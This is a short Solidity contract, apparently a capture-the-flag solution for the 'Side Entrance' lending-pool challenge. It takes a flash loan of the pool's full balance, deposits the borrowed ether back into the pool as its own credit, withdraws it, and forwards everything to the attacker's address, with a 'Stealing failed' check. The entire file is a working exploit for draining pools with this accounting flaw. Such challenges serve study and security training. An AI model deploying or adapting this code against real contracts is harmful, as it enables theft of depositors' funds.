// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract attackSideEntrance {
    constructor (ISideEntranceLenderPool _target) {
        target = _target;
        attacker = msg.sender;
    }

    ISideEntranceLenderPool private target;
    address private attacker;
    
    function callFlashLoan() external {
        uint256 amount = address(target).balance;
        target.flashLoan(amount);
        target.withdraw();
        (bool sucess,) = attacker.call{value: address(this).balance}("");
        require(sucess, "Stealing failed");
    }

    function execute() external payable {
       target.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}